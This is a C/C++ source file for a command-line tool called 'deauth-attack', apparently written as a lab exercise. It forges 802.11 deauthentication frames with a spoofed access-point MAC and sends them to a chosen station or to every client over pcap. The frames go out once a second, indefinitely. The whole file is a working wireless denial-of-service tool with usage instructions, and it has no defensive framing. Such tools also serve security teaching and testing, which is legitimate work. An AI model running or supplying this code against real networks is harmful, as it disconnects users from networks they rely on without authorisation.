#include <stdio.h>
#include <stdint.h>
#include <cstdio>
#include <pcap.h>
#include "mac.h"
#include <unistd.h>

//#pragma pack(push, 1)

struct Radiotaphdr
{
    uint8_t hdrrev = 0x0;
    uint8_t hdrpad = 0x0;
    uint16_t hdrlen = 0x000c;
    uint32_t flags = 0x00008004;
    uint8_t datarate = 0x02;
    uint8_t tmp1 = 0x0;
    uint8_t tmp2 = 0x18;
    uint8_t tmp3 = 0x0;
};

struct Machdr
{
    uint16_t framecontrol = 0x00c0;
    uint16_t dur = 0x013a;

    Mac recaddr;
    Mac transaddr;
    Mac bssid;

    uint16_t num = 0x0000;
    uint16_t management = 0x0007;
};

struct Deauthpkt
{
    // uint8_t hdrrev = 0;
    // uint8_t hdrpad = 0;
    // uint16_t hdrlen = 0x000c;
    // uint32_t flags = 0x00008004;
    // uint8_t datarate = 0x02;
    // uint16_t framecontrol = 0x00c0;
    // uint16_t dur = 0x013a;
    struct Radiotaphdr radiotaphdr;
    // Mac recaddr;
    // Mac transaddr;
    // Mac bssid;

    // uint16_t num;
    // uint16_t management;
    struct Machdr machdr;
};

//#pragma pack(pop)

void usage()
{
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char *argv[])
{
    if (!((argc == 3) || (argc == 4)))
    {
        usage();
        return -1;
    }
    char *dev = argv[1];
    char *apmac = argv[2];
    Mac stationmac;
    if (argc == 4)
        stationmac = Mac(argv[3]);
    else
        stationmac = Mac("ff:ff:ff:ff:ff:ff");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Deauthpkt packet;
    packet.machdr.bssid = Mac(apmac);
    packet.machdr.transaddr = Mac(apmac);
    packet.machdr.recaddr = stationmac;
    while (true)
    {
        int res = pcap_sendpacket(handle, (const u_char *)&packet, 38);
        if (res != 0)
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        sleep(1);
    }
}